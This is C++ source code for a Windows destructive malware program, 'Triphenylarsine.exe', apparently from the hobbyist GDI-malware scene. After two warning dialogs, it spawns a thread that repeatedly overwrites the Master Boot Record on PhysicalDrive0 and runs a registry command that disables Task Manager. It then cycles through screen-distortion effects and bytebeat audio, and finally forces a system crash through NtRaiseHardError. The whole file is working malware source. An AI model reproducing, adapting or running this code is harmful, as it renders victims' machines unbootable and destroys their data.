#include <windows.h>
#include <iostream>
#define _USE_MATH_DEFINES 1
#include <cmath>
#include "mbr.h"
#pragma comment(lib, "winmm.lib")
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE b;
        BYTE g;
        BYTE r;
        BYTE unused;
    };
} *PRGBQUAD;
DWORD WINAPI mbr(LPVOID lpParam) {
    while (1) {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);

        WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
        CloseHandle(hDevice);
    }
}
DWORD WINAPI d(LPVOID lpParam) {
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    return 1;
}
DWORD WINAPI shader1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            data[i].rgb -= x & y;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI shader2(LPVOID lpParam) {
    HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
    PRGBTRIPLE rgbtriple;
    for (;;) {
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(deskMem, scr);
        BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
        for (int i = 0; i < sw * sh; i++) {
            int x = i % sw, y = i / sh;
            rgbtriple[i].rgbtRed += x & y;
            rgbtriple[i].rgbtGreen += x & y;
            rgbtriple[i].rgbtBlue += x & y;
        }
        BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
        ReleaseDC(wnd, desk);
        DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
    }
}
DWORD WINAPI shader3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            data[i].rgb = (data[i].rgb * 2) % (RGB(255, 255, 255));
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI shader4(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h && rand() % 110)
                v = rand() % 100;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI thing5(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        int inc3 = rand() % 700;
        int v = rand() % 2;
        if (v == 1) inc3 = -700;
        inc3++;
        pt[0].x = rect.left - inc3;
        pt[0].y = rect.top + inc3;
        pt[1].x = rect.right - inc3;
        pt[1].y = rect.top - inc3;
        pt[2].x = rect.left + inc3;
        pt[2].y = rect.bottom - inc3;
        PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(hdc, rand() % 20, rand() % 20, sw, sh, hdcMem, rand() % 20, rand() % 20, 0x123456);
        DeleteObject(hdcMem); DeleteObject(bm);
        Sleep(1);
    }
}
DWORD WINAPI cubes(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        StretchBlt(hdc, -10, -10, x + 20, y + 20, hdc, 0, 0, x, y, SRCCOPY);
        StretchBlt(hdc, 10, 10, x - 20, y - 20, hdc, 0, 0, x, y, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI sines(LPVOID lpParam) {
    HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        desk = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sin(angle) * 10;
            BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCINVERT);
            BitBlt(desk, i, 0, 1, sh, desk, i, a, SRCINVERT);
            angle += M_PI / 80;
            DeleteObject(&i); DeleteObject(&a);
        }
        ReleaseDC(wnd, desk);
        DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
    }
}
DWORD WINAPI textouts(LPVOID lpvd)
{
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text = 0;
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    while(1)
    {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        text = "Triphenylarsine";
        text1 = "AMOGUS!!!";
        text2 = "pankoza";
        text3 = "Enjoy your new PC!!!";
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        Sleep(10);
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        DeleteObject(font);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI shader5(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, 4 * h * w, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 10)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; ++i) {
            if (!(i % h) && !(rand() % 110))
                v = rand() % 24;
            *((BYTE*)data + 4 * i + v) -= 5;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI sines2(LPVOID lpParam) {
    HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    double angle = 0;
    while (1) {
        desk = GetDC(0);
        for (float i = 0; i < sw + sh; i += 0.99f) {
            int a = sin(angle) * 10;
            BitBlt(desk, 0, i, sw, 1, desk, a, i, NOTSRCCOPY);
            angle += M_PI / 80;
            DeleteObject(&i); DeleteObject(&a);
        }
        ReleaseDC(wnd, desk);
        DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
    }
}
DWORD WINAPI pacmans(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        Pie(hdc, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(5 * t & t >> 7 | 3 * t & 4 * t >> 10);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 6 ^ t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 ^ -t >> 1);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 30000, 30000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[30000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 9 & 2 * t & 10 * t | t >> 5 & 6 * t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * t / (1 + (t >> 9 & t >> 8)) & 128);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t & t >> 12) * (t >> 4 | t >> 8);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 7 : 5) * (3 - (3 & t >> 9) + (3 & t >> 8)) >> (3 & -t >> (t % 65536 < 59392 ? t & 4096 ? 2 : 16 : 2)) | t >> 3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & -t >> (t & 2048 ? 2 : 10)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 7 | t >> 9) & 30));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t - (t >> 4 & t >> 8) & t >> 12) - 1;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int main()
{
    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Triphenylarsine.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR (pankoza) IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT? (GDI shaders work best in 1920x1080 and 1024x768 resolutions)", L"Triphenylarsine.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, d, 0, 0, 0);
            Sleep(5000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, thing5, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, cubes, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, sines, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread7 = CreateThread(0, 0, shader5, 0, 0, 0);
            HANDLE thread7dot1 = CreateThread(0, 0, cubes, 0, 0, 0);
            HANDLE thread7dot2 = CreateThread(0, 0, textouts, 0, 0, 0);
            sound7();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            TerminateThread(thread7dot1, 0);
            CloseHandle(thread7dot1);
            TerminateThread(thread7dot2, 0);
            CloseHandle(thread7dot2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread8 = CreateThread(0, 0, sines2, 0, 0, 0);
            sound8();
            Sleep(30000);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread9 = CreateThread(0, 0, thing5, 0, 0, 0);
            HANDLE thread9dot1 = CreateThread(0, 0, cubes, 0, 0, 0);
            HANDLE thread9dot2 = CreateThread(0, 0, textouts, 0, 0, 0);
            HANDLE thread9dot3 = CreateThread(0, 0, pacmans, 0, 0, 0);
            sound9();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(0xC000001D, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}